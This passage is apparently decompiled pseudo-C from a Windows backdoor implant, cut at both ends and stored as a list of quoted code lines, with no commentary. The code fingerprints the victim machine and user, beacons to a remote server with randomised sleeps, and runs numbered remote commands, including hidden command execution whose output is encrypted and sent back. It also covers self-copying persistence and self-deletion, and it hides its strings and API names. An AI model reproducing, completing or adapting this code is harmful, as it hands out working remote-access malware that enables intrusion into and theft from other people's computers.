    "  WCHAR *v10; // rax",
    "  size_t v11; // rdi",
    "  wchar_t *v12; // r12",
    "  const wchar_t *v13; // r13",
    "  char *v14; // r13",
    "  int v16; // edi",
    "  char *v17; // rax",
    "  char *v18; // r14",
    "  WCHAR *v19; // rax",
    "  CHAR *v20; // r15",
    "  CHAR *v21; // r13",
    "  unsigned __int64 v22; // kr08_8",
    "  char *v23; // rax",
    "  const char *v24; // rdi",
    "  __int64 v25; // rax",
    "  _DWORD *v26; // rdi",
    "  unsigned int v27; // eax",
    "  unsigned int v28; // eax",
    "  int v29; // [rsp+58h] [rbp-430h]",
    "  char *v30; // [rsp+58h] [rbp-430h]",
    "  _BYTE v31[272]; // [rsp+60h] [rbp-428h] BYREF",
    "  WCHAR Buffer[260]; // [rsp+170h] [rbp-318h] BYREF",
    "  DWORD NumberOfBytesRead; // [rsp+378h] [rbp-110h] BYREF",
    "  DWORD TotalBytesAvail; // [rsp+37Ch] [rbp-10Ch] BYREF",
    "  HANDLE hWritePipe; // [rsp+380h] [rbp-108h] BYREF",
    "  HANDLE hReadPipe; // [rsp+388h] [rbp-100h] BYREF",
    "  struct _SECURITY_ATTRIBUTES PipeAttributes; // [rsp+390h] [rbp-F8h] BYREF",
    "  HANDLE ProcessInformation[4]; // [rsp+3B0h] [rbp-D8h] BYREF",
    "  _BYTE StartupInfo[184]; // [rsp+3D0h] [rbp-B8h] BYREF",
    "",
    "  *(_QWORD *)&PipeAttributes.nLength = 24;",
    "  PipeAttributes.lpSecurityDescriptor = 0;",
    "  *(_QWORD *)&PipeAttributes.bInheritHandle = 1;",
    "  v9 = 0;",
    "  if ( CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x100000u) )",
    "  {",
    "    SetHandleInformation(hReadPipe, 1u, 0);",
    "    memset(StartupInfo, 0, 0x58u);",
    "    memset(ProcessInformation, 0, 24);",
    "    *(_DWORD *)StartupInfo = 104;",
    "    *(_QWORD *)&StartupInfo[96] = hWritePipe;",
    "    *(_QWORD *)&StartupInfo[88] = hWritePipe;",
    "    *(_DWORD *)&StartupInfo[60] = 256;",
    "    v10 = sub_62742640(a3);",
    "    v9 = v10;",
    "    if ( v10 )",
    "    {",
    "      v11 = wcslen(v10) + 1025;",
    "      v12 = (wchar_t *)sub_62745B80(2 * v11);",
    "      if ( v12 )",
    "      {",
    "        v13 = (const wchar_t *)sub_62746BA0(&unk_6274B5D0);",
    "        sub_62742580(v12, v11, v13, v9);",
    "        sub_62746C30(v13);",
    "        GetCurrentDirectoryW(0x104u, Buffer);",
    "        v14 = 0;",
    "        if ( CreateProcessW(",
    "               0,",
    "               v12,",
    "               0,",
    "               0,",
    "               1,",
    "               0x8000000u,",
    "               0,",
    "               Buffer,",
    "               (LPSTARTUPINFOW)StartupInfo,",
    "               (LPPROCESS_INFORMATION)ProcessInformation) )",
    "        {",
    "          WaitForSingleObject(ProcessInformation[0], 0x1388u);",
    "          v29 = sub_62743D10();",
    "          TotalBytesAvail = 0;",
    "          GetModuleHandleW(0);",
    "          v16 = 52;",
    "          while ( PeekNamedPipe(hReadPipe, 0, 0, 0, &TotalBytesAvail, 0) )",
    "          {",
    "            if ( TotalBytesAvail )",
    "              goto LABEL_18;",
    "            GetModuleHandleW(0);",
    "            if ( !--v16 )",
    "              break;",
    "            Sleep(0x64u);",
    "          }",
    "          if ( TotalBytesAvail )",
    "          {",
    "LABEL_18:",
    "            v17 = (char *)sub_62745B80(TotalBytesAvail + 1);",
    "            v14 = v17;",
    "            if ( !v17 )",
    "              goto LABEL_17;",
    "            ReadFile(hReadPipe, v17, TotalBytesAvail, &NumberOfBytesRead, 0);",
    "            v18 = v14;",
    "            goto LABEL_20;",
    "          }",
    "          if ( v29 )",
    "          {",
    "            GetCurrentDirectoryW(0x104u, Buffer);",
    "            v21 = sub_627426C0(Buffer);",
    "            if ( v21 )",
    "            {",
    "              v22 = strlen(v21) + 1;",
    "              TotalBytesAvail = v22 + 2;",
    "              v23 = (char *)sub_62745B80((unsigned int)(v22 + 3));",
    "              v18 = v23;",
    "              if ( !v23 )",
    "              {",
    "                v14 = 0;",
    "                goto LABEL_17;",
    "              }",
    "              strcpy(v23, v21);",
    "              strcat(v18, \"\\r\\n\");",
    "              sub_62745BE0(v21);",
    "            }",
    "            else",
    "            {",
    "              wcscpy((wchar_t *)&TotalBytesAvail, L\"\\x01\");",
    "              v18 = (char *)sub_62745B80(2u);",
    "              if ( !v18 )",
    "              {",
    "                v14 = 0;",
    "                goto LABEL_17;",
    "              }",
    "            }",
    "          }",
    "          else",
    "          {",
    "            wcscpy((wchar_t *)&TotalBytesAvail, L\"\\x14\");",
    "            v14 = (char *)sub_62745B80(0x15u);",
    "            if ( !v14 )",
    "              goto LABEL_17;",
    "            v24 = (const char *)sub_62746B10(&unk_6274B5F5);",
    "            strcpy(v14, v24);",
    "            sub_62746C30(v24);",
    "            v18 = v14;",
    "          }",
    "LABEL_20:",
    "          v19 = sub_62742760(v18);",
    "          v14 = (char *)v19;",
    "          if ( v19 )",
    "          {",
    "            v20 = sub_627425A0(v19);",
    "            v30 = v20;",
    "            if ( v20 )",
    "            {",
    "              v30 = 0;",
    "              if ( TotalBytesAvail )",
    "              {",
    "                v25 = sub_62745B80(2LL * TotalBytesAvail + 1026);",
    "                v26 = (_DWORD *)v25;",
    "                v30 = (char *)v25;",
    "                if ( v25 )",
    "                {",
    "                  *(_DWORD *)(v25 + 4) = *a1;",
    "                  *(_DWORD *)(v25 + 8) = a1[1];",
    "                  *(_DWORD *)(v25 + 12) = 2;",
    "                  *(_DWORD *)(v25 + 16) = 4;",
    "                  *(_DWORD *)(v25 + 20) = a2;",
    "                  v27 = (unsigned int)sub_62741530((_BYTE *)(v25 + 36), v20, strlen(v20));",
    "                  v26[6] = 36;",
    "                  v26[7] = v27;",
    "                  v28 = (v27 + 3) & 0xFFFFFFFC;",
    "                  TotalBytesAvail = v28 + 36;",
    "                  *v26 = sub_62741E70(v26 + 1, v28 + 32, 0);",
    "                  if ( a5 )",
    "                  {",
    "                    sub_62745FF0(v31, a4, strlen(a4));",
    "                    sub_62746060(v31, v30, v30, TotalBytesAvail);",
    "                  }",
    "                  *a6 = TotalBytesAvail;",
    "                }",
    "              }",
    "              sub_62745BE0(v20);",
    "            }",
    "            sub_62745BE0(v14);",
    "            v14 = v30;",
    "          }",
    "          sub_62745BE0(v18);",
    "LABEL_17:",
    "          TerminateProcess(ProcessInformation[0], 0);",
    "          CloseHandle(ProcessInformation[0]);",
    "          CloseHandle(ProcessInformation[1]);",
    "        }",
    "        sub_62745BE0(v12);",
    "        v12 = (wchar_t *)v14;",
    "      }",
    "      sub_62745BE0(v9);",
    "      v9 = v12;",
    "    }",
    "    CloseHandle(hWritePipe);",
    "    CloseHandle(hReadPipe);",
    "  }",
    "  return v9;",
    "}",
    "",
    "",
    "char *__fastcall sub_627444A0(",
    "        _DWORD *a1,",
    "        int a2,",
    "        int a3,",
    "        int a4,",
    "        __int64 a5,",
    "        __int64 a6,",
    "        __int64 a7,",
    "        int a8,",
    "        const char *a9,",
    "        int a10,",
    "        unsigned int *a11)",
    "{",
    "  int v14; // ecx",
    "  int v15; // r12d",
    "  char *v16; // rax",
    "  char *v17; // rbx",
    "  const char *v18; // rbp",
    "  unsigned __int64 v19; // kr08_8",
    "  int v20; // esi",
    "  unsigned int v21; // ebp",
    "  _BYTE v23[312]; // [rsp+30h] [rbp-138h] BYREF",
    "",
    "  v14 = 1;",
    "  if ( a2 != 7 )",
    "    v14 = (a2 != 8) + 2;",
    "  v15 = sub_62746DC0(v14, a7, a8, a4, a5, a6);",
    "  v16 = (char *)sub_62745B80(0x400u);",
    "  v17 = v16;",
    "  if ( v16 )",
    "  {",
    "    *((_DWORD *)v16 + 1) = *a1;",
    "    *((_DWORD *)v16 + 2) = a1[1];",
    "    *((_DWORD *)v16 + 3) = 2;",
    "    *((_DWORD *)v16 + 4) = a2;",
    "    *((_DWORD *)v16 + 5) = a3;",
    "    if ( v15 )",
    "      v18 = (const char *)sub_62746B10(&unk_6274B611);",
    "    else",
    "      v18 = (const char *)sub_62746B10(&unk_6274B61B);",
    "    v19 = strlen(v18) + 1;",
    "    strcpy(v17 + 32, v18);",
    "    sub_62746C30(v18);",
    "    *((_DWORD *)v17 + 6) = 32;",
    "    *((_DWORD *)v17 + 7) = v19;",
    "    v20 = (v19 - 1 + 4) & 0xFFFFFFFC;",
    "    v21 = v20 + 32;",
    "    *(_DWORD *)v17 = sub_62741E70(v17 + 4, (unsigned int)(v20 + 28), 0);",
    "    if ( a10 )",
    "    {",
    "      sub_62745FF0(v23, a9, strlen(a9));",
    "      sub_62746060(v23, v17, v17, v21);",
    "    }",
    "    *a11 = v21;",
    "  }",
    "  return v17;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62744620(HMODULE hModule, __int64 a2, int a3)",
    "{",
    "  const WCHAR *v6; // rbx",
    "  HMODULE LibraryW; // rsi",
    "  const CHAR *v8; // rbx",
    "  FARPROC ProcAddress; // r14",
    "  const CHAR *v10; // rbx",
    "  FARPROC v11; // rsi",
    "  const WCHAR *v12; // rbx",
    "  HMODULE v13; // r12",
    "  const CHAR *v14; // rbx",
    "  FARPROC v15; // rbp",
    "  int v16; // eax",
    "  unsigned int v17; // ebx",
    "  const wchar_t *v19; // rbx",
    "  const wchar_t *v20; // rbx",
    "  __int64 v21; // rsi",
    "  const wchar_t *v22; // rbx",
    "  __int64 v23; // rbx",
    "  __int64 v24; // rdi",
    "  wchar_t v25[264]; // [rsp+30h] [rbp-678h] BYREF",
    "  wchar_t Destination[264]; // [rsp+240h] [rbp-468h] BYREF",
    "  WCHAR Filename[300]; // [rsp+450h] [rbp-258h] BYREF",
    "",
    "  v6 = (const WCHAR *)sub_62746BA0(&unk_6274B628);",
    "  LibraryW = LoadLibraryW(v6);",
    "  sub_62746C30(v6);",
    "  v8 = (const CHAR *)sub_62746B10(&unk_6274B649);",
    "  ProcAddress = GetProcAddress(LibraryW, v8);",
    "  sub_62746C30(v8);",
    "  v10 = (const CHAR *)sub_62746B10(&unk_6274B660);",
    "  v11 = GetProcAddress(LibraryW, v10);",
    "  sub_62746C30(v10);",
    "  v12 = (const WCHAR *)sub_62746BA0(&unk_6274B688);",
    "  v13 = LoadLibraryW(v12);",
    "  sub_62746C30(v12);",
    "  v14 = (const CHAR *)sub_62746B10(&unk_6274B6A7);",
    "  v15 = GetProcAddress(v13, v14);",
    "  sub_62746C30(v14);",
    "  ((void (__fastcall *)(__int64, wchar_t *, __int64))v11)(a2, Destination, 260);",
    "  v16 = ((__int64 (__fastcall *)(_QWORD, wchar_t *))v15)(0, Destination);",
    "  if ( !v16 || (v17 = 0, v16 == 183) )",
    "  {",
    "    v19 = (const wchar_t *)sub_62746BA0(&unk_6274B6C1);",
    "    wcscat(Destination, v19);",
    "    sub_62746C30(v19);",
    "    if ( (unsigned int)sub_62748410(hModule) )",
    "    {",
    "      v22 = (const wchar_t *)sub_62746BA0(&unk_6274B6D0);",
    "      wcscat(Destination, v22);",
    "      sub_62746C30(v22);",
    "      GetModuleFileNameW(hModule, Filename, 0x104u);",
    "      v17 = ((__int64 (__fastcall *)(WCHAR *, wchar_t *, _QWORD))ProcAddress)(Filename, Destination, 0);",
    "      if ( !v17 )",
    "        return v17;",
    "      v21 = sub_62746BA0(&unk_6274B70F);",
    "      v23 = sub_62746BA0(&unk_6274B71C);",
    "      sub_62742580(v25, 0x104u, L\"\\\"%ls\\\",%ls %ls\", Destination, v23, v21);",
    "      sub_62746C30(v23);",
    "      v24 = sub_62746BA0(&unk_6274B750);",
    "      v17 = sub_62747840(a3, v24, (unsigned int)v25, 60, 10);",
    "      sub_62746C30(v24);",
    "    }",
    "    else",
    "    {",
    "      v20 = (const wchar_t *)sub_62746BA0(&unk_6274B6F0);",
    "      wcscat(Destination, v20);",
    "      sub_62746C30(v20);",
    "      GetModuleFileNameW(hModule, Filename, 0x104u);",
    "      v17 = ((__int64 (__fastcall *)(WCHAR *, wchar_t *, _QWORD))ProcAddress)(Filename, Destination, 0);",
    "      if ( !v17 )",
    "        return v17;",
    "      v21 = sub_62746BA0(&unk_6274B70F);",
    "      v17 = sub_62747840(a3, (unsigned int)Destination, v21, 60, 10);",
    "    }",
    "    sub_62746C30(v21);",
    "  }",
    "  return v17;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62744900(int a1, int a2)",
    "{",
    "  DWORD TickCount; // eax",
    "",
    "  TickCount = GetTickCount();",
    "  srand(TickCount);",
    "  return rand() % (unsigned int)(a2 - a1 + 1) + a1;",
    "}",
    "",
    "",
    "__int64 sub_62744940()",
    "{",
    "  int v0; // eax",
    "  __int64 v1; // r12",
    "  __int64 v2; // rdi",
    "  const char *v3; // rsi",
    "  const wchar_t *v4; // rbx",
    "  size_t v5; // rax",
    "  char *v7; // [rsp+28h] [rbp-30h] BYREF",
    "",
    "  v7 = 0;",
    "  v0 = sub_627475F0(&v7);",
    "  if ( v0 )",
    "  {",
    "    if ( v0 > 0 )",
    "    {",
    "      v1 = 8LL * (unsigned int)(v0 - 1) + 8;",
    "      v2 = 0;",
    "LABEL_4:",
    "      while ( 2 )",
    "      {",
    "        v3 = (const char *)&off_6274A270;",
    "        do",
    "        {",
    "          while ( 1 )",
    "          {",
    "            _mm_prefetch(v3, 1);",
    "            v4 = (const wchar_t *)sub_62746BA0(*((_QWORD *)v3 - 6));",
    "            v5 = wcslen(v4);",
    "            if ( !wcsncmp(*(const wchar_t **)&v7[v2], v4, v5) )",
    "              break;",
    "            sub_62746C30(v4);",
    "            v3 += 16;",
    "            if ( v3 == (const char *)&unk_6274A680 )",
    "            {",
    "              v2 += 8;",
    "              if ( v2 != v1 )",
    "                goto LABEL_4;",
    "              goto LABEL_8;",
    "            }",
    "          }",
    "          sub_62747BA0(*(_QWORD *)&v7[v2]);",
    "          sub_62746C30(v4);",
    "          v3 += 16;",
    "        }",
    "        while ( v3 != (const char *)&unk_6274A680 );",
    "        v2 += 8;",
    "        if ( v2 != v1 )",
    "          continue;",
    "        break;",
    "      }",
    "    }",
    "LABEL_8:",
    "    sub_62745BE0(v7);",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 sub_62744A30()",
    "{",
    "  const WCHAR *v0; // rsi",
    "  HMODULE LibraryW; // rbx",
    "  const CHAR *v2; // rsi",
    "  FARPROC ProcAddress; // rdi",
    "  const CHAR *v4; // rsi",
    "  FARPROC v5; // r12",
    "  const CHAR *v6; // rsi",
    "  FARPROC v7; // rbp",
    "  __int64 v8; // rsi",
    "  WCHAR FileName[264]; // [rsp+20h] [rbp-458h] BYREF",
    "  WCHAR Filename[292]; // [rsp+230h] [rbp-248h] BYREF",
    "",
    "  v0 = (const WCHAR *)sub_62746BA0(&unk_6274B628);",
    "  LibraryW = LoadLibraryW(v0);",
    "  sub_62746C30(v0);",
    "  v2 = (const CHAR *)sub_62746B10(&unk_6274B771);",
    "  ProcAddress = GetProcAddress(LibraryW, v2);",
    "  sub_62746C30(v2);",
    "  v4 = (const CHAR *)sub_62746B10(&unk_6274B783);",
    "  v5 = GetProcAddress(LibraryW, v4);",
    "  sub_62746C30(v4);",
    "  v6 = (const CHAR *)sub_62746B10(&unk_6274B798);",
    "  v7 = GetProcAddress(LibraryW, v6);",
    "  sub_62746C30(v6);",
    "  sub_62744940();",
    "  GetModuleFileNameW(qword_627510B0, Filename, 0x104u);",
    "  ((void (__fastcall *)(__int64, WCHAR *))v5)(260, FileName);",
    "  v8 = sub_62746BA0(&unk_6274B7B1);",
    "  ((void (__fastcall *)(WCHAR *, __int64, _QWORD, WCHAR *))v7)(FileName, v8, 0, FileName);",
    "  sub_62746C30(v8);",
    "  DeleteFileW(FileName);",
    "  ((void (__fastcall *)(WCHAR *, WCHAR *))ProcAddress)(Filename, FileName);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62744B50(__int64 a1, const wchar_t *a2)",
    "{",
    "  const WCHAR *v3; // rsi",
    "  int v4; // eax",
    "  int v5; // eax",
    "  CHAR *v6; // rax",
    "  WCHAR *v7; // r14",
    "  int v8; // r15d",
    "  __int64 v9; // rbp",
    "  __int64 v10; // rsi",
    "  char *v11; // rbx",
    "  const WCHAR *v12; // rbx",
    "  HANDLE v13; // rax",
    "  __int16 TickCount; // ax",
    "  char *v16; // rdi",
    "  int v17; // ebp",
    "  int v18; // ebx",
    "  char *v19; // rax",
    "  char *v20; // rsi",
    "  char *v21; // rax",
    "  _DWORD *v22; // rax",
    "  void *v23; // rsi",
    "  char *v24; // rax",
    "  _DWORD *v25; // rax",
    "  void *v26; // rsi",
    "  char *v27; // rax",
    "  _DWORD *v28; // rax",
    "  void *v29; // rsi",
    "  char *v30; // rax",
    "  char *v31; // rax",
    "  char *v32; // rsi",
    "  char *v33; // rax",
    "  char *v34; // rsi",
    "  WCHAR *v35; // rax",
    "  char *v36; // rax",
    "  __int64 v37; // rsi",
    "  _DWORD *v38; // rax",
    "  void *v39; // rsi",
    "  char *v40; // rax",
    "  const char *v41; // [rsp+60h] [rbp-608h]",
    "  const WCHAR *v42; // [rsp+68h] [rbp-600h]",
    "  CHAR *v43; // [rsp+70h] [rbp-5F8h]",
    "  int v44; // [rsp+78h] [rbp-5F0h]",
    "  __int64 v45; // [rsp+80h] [rbp-5E8h]",
    "  __int64 v46; // [rsp+88h] [rbp-5E0h]",
    "  WCHAR *v47; // [rsp+90h] [rbp-5D8h]",
    "  __int64 v48; // [rsp+90h] [rbp-5D8h]",
    "  char *v49; // [rsp+98h] [rbp-5D0h]",
    "  _BYTE v50[272]; // [rsp+A0h] [rbp-5C8h] BYREF",
    "  int v51; // [rsp+1B0h] [rbp-4B8h] BYREF",
    "  __int64 v52; // [rsp+1B4h] [rbp-4B4h] BYREF",
    "  DWORD v53; // [rsp+1BCh] [rbp-4ACh] BYREF",
    "  WCHAR v54[262]; // [rsp+1C0h] [rbp-4A8h] BYREF",
    "  DWORD nSize; // [rsp+3CCh] [rbp-29Ch] BYREF",
    "  WCHAR Buffer[22]; // [rsp+3D0h] [rbp-298h] BYREF",
    "  DWORD v57; // [rsp+3FCh] [rbp-26Ch] BYREF",
    "  WCHAR v58[256]; // [rsp+400h] [rbp-268h] BYREF",
    "  _DWORD v59[4]; // [rsp+600h] [rbp-68h] BYREF",
    "  _DWORD v60[3]; // [rsp+610h] [rbp-58h] BYREF",
    "  DWORD VolumeSerialNumber[19]; // [rsp+61Ch] [rbp-4Ch] BYREF",
    "",
    "  VolumeSerialNumber[0] = 0;",
    "  v3 = (const WCHAR *)sub_62746BA0(&unk_6274B7C0);",
    "  GetVolumeInformationW(v3, 0, 0, VolumeSerialNumber, 0, 0, 0, 0);",
    "  sub_62746C30(v3);",
    "  GetModuleHandleW(0);",
    "  nSize = 16;",
    "  GetComputerNameW(Buffer, &nSize);",
    "  GetModuleHandleW(0);",
    "  v57 = 256;",
    "  v58[0] = 0;",
    "  GetComputerNameExW(ComputerNameDnsDomain, v58, &v57);",
    "  GetModuleHandleW(0);",
    "  v53 = 257;",
    "  GetUserNameW(v54, &v53);",
    "  GetModuleHandleW(0);",
    "  v4 = wcslen(a2);",
    "  v5 = sub_62741E70(a2, (unsigned int)(2 * v4), 0xFFFFFFFFLL);",
    "  v60[0] = VolumeSerialNumber[0] ^ v5;",
    "  LODWORD(v3) = sub_62741E70(Buffer, 2 * nSize, 0xFFFFFFFFLL);",
    "  v60[1] = sub_62741E70(v54, 2 * v53, 0xFFFFFFFFLL) ^ (unsigned int)v3;",
    "  sub_62745C10(v59);",
    "  v41 = (const char *)sub_62746B10(&unk_6274A0E0);",
    "  v42 = (const WCHAR *)sub_62746BA0(&unk_6274A020);",
    "  v6 = sub_62742960(v60, v59, v58, Buffer, v54, v42, a2, v41, 1, (unsigned int *)&v51);",
    "  v43 = v6;",
    "  if ( !v6 )",
    "    goto LABEL_12;",
    "  v7 = sub_627428E0(v6, v51);",
    "  if ( !v7 )",
    "    goto LABEL_11;",
    "  v8 = 0;",
    "  while ( 1 )",
    "  {",
    "    v9 = sub_62746BA0(&unk_6274A160);",
    "    v10 = sub_62746BA0(&unk_6274A120);",
    "    if ( dword_6274A000 )",
    "      v8 = 1;",
    "    v11 = sub_62741F30(v9, v10, word_6274A004, 1, (__int64)&unk_6274B7D0, (HKEY *)v7, 0, 0, (_DWORD *)&v52 + 1, v8);",
    "    if ( v11 )",
    "    {",
    "      if ( HIDWORD(v52) > 4 )",
    "        break;",
    "    }",
    "    sub_62746C30(v10);",
    "    sub_62746C30(v9);",
    "    v12 = (const WCHAR *)sub_62746BA0(&unk_6274B7F8);",
    "    v13 = OpenMutexW(0x100000u, 0, v12);",
    "    if ( v13 )",
    "      goto LABEL_9;",
    "    sub_62746C30(v12);",
    "LABEL_14:",
    "    GetModuleHandleW(0);",
    "    TickCount = GetTickCount();",
    "    Sleep((TickCount & 0xFFF) + 15000);",
    "  }",
    "  sub_62745FF0(v50, v41, strlen(v41));",
    "  sub_62746060(v50, v11, v11, HIDWORD(v52));",
    "  v44 = 0;",
    "  if ( (unsigned int)sub_62741E70(v11 + 4, (unsigned int)(HIDWORD(v52) - 4), 0) == *(_DWORD *)v11 )",
    "  {",
    "    v16 = v11 + 8;",
    "    if ( *((_DWORD *)v11 + 1) )",
    "    {",
    "      v45 = v9;",
    "      v46 = v10;",
    "      v49 = v11;",
    "      v17 = *((_DWORD *)v11 + 1);",
    "      v18 = 0;",
    "      do",
    "      {",
    "        switch ( *(_DWORD *)v16 )",
    "        {",
    "          case 1:",
    "            v28 = sub_62742CD0(v60, *((_DWORD *)v16 + 1), v41, 1, &v51);",
    "            v29 = v28;",
    "            if ( v28 )",
    "            {",
    "              v30 = sub_62741F30(",
    "                      v45,",
    "                      v46,",
    "                      word_6274A004,",
    "                      2,",
    "                      (__int64)&unk_6274B7D0,",
    "                      (HKEY *)v7,",
    "                      (__int64)v28,",
    "                      v51,",
    "                      &v52,",
    "                      v8);",
    "              if ( v30 )",
    "                sub_62745BE0(v30);",
    "              sub_62745BE0(v29);",
    "            }",
    "            v16 += 8;",
    "            break;",
    "          case 2:",
    "            v38 = sub_62743070(v60, *((_DWORD *)v16 + 1), v41, 1, (ULONG *)&v51);",
    "            v39 = v38;",
    "            if ( v38 )",
    "            {",
    "              v40 = sub_62741F30(",
    "                      v45,",
    "                      v46,",
    "                      word_6274A004,",
    "                      2,",
    "                      (__int64)&unk_6274B7D0,",
    "                      (HKEY *)v7,",
    "                      (__int64)v38,",
    "                      v51,",
    "                      &v52,",
    "                      v8);",
    "              if ( v40 )",
    "                sub_62745BE0(v40);",
    "              sub_62745BE0(v39);",
    "            }",
    "            v16 += 8;",
    "            break;",
    "          case 3:",
    "            v31 = sub_62743670(v60, *((_DWORD *)v16 + 1), v41, 1, &v51);",
    "            v32 = v31;",
    "            if ( v31 )",
    "            {",
    "              v33 = sub_62741F30(",
    "                      v45,",
    "                      v46,",
    "                      word_6274A004,",
    "                      2,",
    "                      (__int64)&unk_6274B7D0,",
    "                      (HKEY *)v7,",
    "                      (__int64)v31,",
    "                      v51,",
    "                      &v52,",
    "                      v8);",
    "              if ( v33 )",
    "                sub_62745BE0(v33);",
    "              sub_62745BE0(v32);",
    "            }",
    "            v16 += 8;",
    "            break;",
    "          case 4:",
    "            v34 = v16 + 16;",
    "            v35 = sub_62743EA0(v60, *((_DWORD *)v16 + 1), v16 + 16, v41, 1, &v51);",
    "            v47 = v35;",
    "            v16 += 16;",
    "            if ( v35 )",
    "            {",
    "              v36 = sub_62741F30(",
    "                      v45,",
    "                      v46,",
    "                      word_6274A004,",
    "                      2,",
    "                      (__int64)&unk_6274B7D0,",
    "                      (HKEY *)v7,",
    "                      (__int64)v35,",
    "                      v51,",
    "                      &v52,",
    "                      v8);",
    "              if ( v36 )",
    "                sub_62745BE0(v36);",
    "              sub_62745BE0(v47);",
    "              v16 = v34;",
    "            }",
    "            break;",
    "          case 5:",
    "            v25 = sub_62743890(",
    "                    v60,",
    "                    *((_DWORD *)v16 + 1),",
    "                    (__int64)(v16 + 24),",
    "                    &v16[*((unsigned int *)v16 + 4) - 8],",
    "                    *((_DWORD *)v16 + 5),",
    "                    v41,",
    "                    1,",
    "                    (unsigned int *)&v51);",
    "            v26 = v25;",
    "            if ( v25 )",
    "            {",
    "              v27 = sub_62741F30(",
    "                      v45,",
    "                      v46,",
    "                      word_6274A004,",
    "                      2,",
    "                      (__int64)&unk_6274B7D0,",
    "                      (HKEY *)v7,",
    "                      (__int64)v25,",
    "                      v51,",
    "                      &v52,",
    "                      v8);",
    "              if ( v27 )",
    "                sub_62745BE0(v27);",
    "              sub_62745BE0(v26);",
    "            }",
    "            v16 += 16;",
    "            break;",
    "          case 6:",
    "            v22 = sub_62743B20(v60, *((_DWORD *)v16 + 1), (__int64)(v16 + 16), v41, 1, (unsigned int *)&v51);",
    "            v23 = v22;",
    "            if ( v22 )",
    "            {",
    "              v24 = sub_62741F30(",
    "                      v45,",
    "                      v46,",
    "                      word_6274A004,",
    "                      2,",
    "                      (__int64)&unk_6274B7D0,",
    "                      (HKEY *)v7,",
    "                      (__int64)v22,",
    "                      v51,",
    "                      &v52,",
    "                      v8);",
    "              if ( v24 )",
    "                sub_62745BE0(v24);",
    "              sub_62745BE0(v23);",
    "            }",
    "            v16 += 8;",
    "            break;",
    "          case 7:",
    "          case 8:",
    "            v19 = sub_627444A0(",
    "                    v60,",
    "                    *(_DWORD *)v16,",
    "                    *((_DWORD *)v16 + 1),",
    "                    (int)v16 + *((_DWORD *)v16 + 2) - 8,",
    "                    (__int64)&v16[*((unsigned int *)v16 + 4) - 8],",
    "                    (__int64)&v16[*((unsigned int *)v16 + 6) - 8],",
    "                    (__int64)&v16[*((unsigned int *)v16 + 8) - 8],",
    "                    *((_DWORD *)v16 + 9),",
    "                    v41,",
    "                    1,",
    "                    (unsigned int *)&v51);",
    "            v20 = v19;",
    "            if ( v19 )",
    "            {",
    "              v21 = sub_62741F30(",
    "                      v45,",
    "                      v46,",
    "                      word_6274A004,",
    "                      2,",
    "                      (__int64)&unk_6274B7D0,",
    "                      (HKEY *)v7,",
    "                      (__int64)v19,",
    "                      v51,",
    "                      &v52,",
    "                      v8);",
    "              if ( v21 )",
    "                sub_62745BE0(v21);",
    "              sub_62745BE0(v20);",
    "            }",
    "            v16 += 16;",
    "            break;",
    "          case 0xA:",
    "            v48 = sub_62746B10(&unk_6274B7D4);",
    "            v37 = sub_62746B10(&unk_6274B7E2);",
    "            sub_62746DC0(",
    "              2,",
    "              (_DWORD)v16 + *((_DWORD *)v16 + 2) - 8,",
    "              *((_DWORD *)v16 + 3),",
    "              (unsigned int)&unk_6274B7F2,",
    "              v48,",
    "              v37);",
    "            sub_62746C30(v48);",
    "            sub_62746C30(v37);",
    "            v16 += 8;",
    "            break;",
    "          case 0xB:",
    "            sub_62744A30();",
    "            v16 += 8;",
    "            v44 = 1;",
    "            break;",
    "          default:",
    "            break;",
    "        }",
    "        ++v18;",
    "      }",
    "      while ( v17 != v18 );",
    "      v9 = v45;",
    "      v10 = v46;",
    "      v11 = v49;",
    "    }",
    "    else",
    "    {",
    "      v44 = 0;",
    "    }",
    "  }",
    "  sub_62745BE0(v11);",
    "  sub_62746C30(v10);",
    "  sub_62746C30(v9);",
    "  v12 = (const WCHAR *)sub_62746BA0(&unk_6274B7F8);",
    "  v13 = OpenMutexW(0x100000u, 0, v12);",
    "  if ( !v13 )",
    "  {",
    "    sub_62746C30(v12);",
    "    if ( v44 )",
    "      goto LABEL_10;",
    "    goto LABEL_14;",
    "  }",
    "LABEL_9:",
    "  CloseHandle(v13);",
    "  sub_62746C30(v12);",
    "LABEL_10:",
    "  sub_62745BE0(v7);",
    "LABEL_11:",
    "  sub_62745BE0(v43);",
    "LABEL_12:",
    "  sub_62746C30(v42);",
    "  return sub_62746C30(v41);",
    "}",
    "",
    "",
    "__int64 sub_62745590()",
    "{",
    "  OLECHAR *v0; // rbx",
    "  OLECHAR *v1; // rbx",
    "",
    "  v0 = (OLECHAR *)sub_62746BA0(off_6274A650);",
    "  sub_62747CC0(v0);",
    "  sub_62746C30(v0);",
    "  v1 = (OLECHAR *)sub_62746BA0(off_6274A658);",
    "  sub_62747CC0(v1);",
    "  sub_62746C30(v1);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 sub_627455E0()",
    "{",
    "  const wchar_t *v0; // rsi",
    "  const char *v1; // rdi",
    "  const wchar_t *v2; // rbp",
    "  __int64 v4; // [rsp+28h] [rbp-CD0h]",
    "  wchar_t *Source; // [rsp+30h] [rbp-CC8h]",
    "  wchar_t *v6; // [rsp+38h] [rbp-CC0h]",
    "  wchar_t *v7; // [rsp+40h] [rbp-CB8h]",
    "  wchar_t *v8; // [rsp+48h] [rbp-CB0h]",
    "  wchar_t v9[264]; // [rsp+50h] [rbp-CA8h] BYREF",
    "  wchar_t FileName[264]; // [rsp+260h] [rbp-A98h] BYREF",
    "  wchar_t PathName[264]; // [rsp+470h] [rbp-888h] BYREF",
    "  wchar_t Dst[264]; // [rsp+680h] [rbp-678h] BYREF",
    "  wchar_t Src[264]; // [rsp+890h] [rbp-468h] BYREF",
    "  wchar_t Destination[300]; // [rsp+AA0h] [rbp-258h] BYREF",
    "",
    "  sub_62744940();",
    "  Source = (wchar_t *)sub_62746BA0(&unk_6274B880);",
    "  v6 = (wchar_t *)sub_62746BA0(&unk_6274B8AB);",
    "  v0 = (const wchar_t *)sub_62746BA0(&unk_6274B6C1);",
    "  v7 = (wchar_t *)sub_62746BA0(&unk_6274B6F0);",
    "  v8 = (wchar_t *)sub_62746BA0(&unk_6274B6D0);",
    "  v1 = (const char *)&off_6274A258;",
    "  do",
